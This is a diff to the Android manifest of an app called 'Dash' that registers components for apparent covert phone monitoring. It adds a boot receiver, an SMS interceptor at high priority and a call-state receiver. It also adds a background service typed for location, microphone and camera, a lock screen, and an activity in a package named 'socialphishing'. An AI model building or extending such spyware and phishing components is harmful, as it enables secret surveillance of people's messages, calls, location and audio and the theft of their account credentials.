@@ -88,6 +88,7 @@
     <uses-permission android:name="android.permission.ACCESS_ADSERVICES_AD_ID" />
 
     <application
+        android:name="com.github.muneebwanee.dash.app.DashApplication"
         android:allowBackup="false"
         android:appComponentFactory="androidx.core.app.CoreComponentFactory"
         android:dataExtractionRules="@xml/data_extraction_rules"
@@ -104,15 +105,74 @@
 
         <!-- Main Activities -->
         <activity
-            android:name="com.github.muneebwanee.dash.MainActivity"
+            android:name="com.github.muneebwanee.dash.ui.activities.login.LoginActivity"
             android:exported="true"
-            android:theme="@style/Theme.Dash" >
+            android:theme="@style/Theme.Dash.Login" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+        <activity
+            android:name="com.github.muneebwanee.dash.ui.activities.mainchild.MainChildActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
+        <activity
+            android:name="com.github.muneebwanee.dash.ui.activities.mainparent.MainParentActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
+        <activity
+            android:name="com.github.muneebwanee.dash.ui.activities.lock.LockActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash.Lock" />
+        <activity
+            android:name="com.github.muneebwanee.dash.ui.activities.register.RegisterActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
+        <activity
+            android:name="com.github.muneebwanee.dash.ui.activities.socialphishing.SocialActivityM"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
+
+        <!-- Services -->
+        <service
+            android:name="com.github.muneebwanee.dash.services.MonitoringService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="location|microphone|camera|dataSync" />
+
+        <!-- Receivers -->
+        <receiver
+            android:name="com.github.muneebwanee.dash.receiver.BootReceiver"
+            android:enabled="true"
+            android:exported="false" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.github.muneebwanee.dash.receiver.MonitorReceiver"
+            android:enabled="true"
+            android:exported="false" />
+        <receiver
+            android:name="com.github.muneebwanee.dash.receiver.SmsReceiver"
+            android:enabled="true"
+            android:exported="false" >
+            <intent-filter android:priority="999" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.github.muneebwanee.dash.receiver.CallsReceiver"
+            android:enabled="true"
+            android:exported="false" >
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
 
         <!-- Firebase -->
         <meta-data
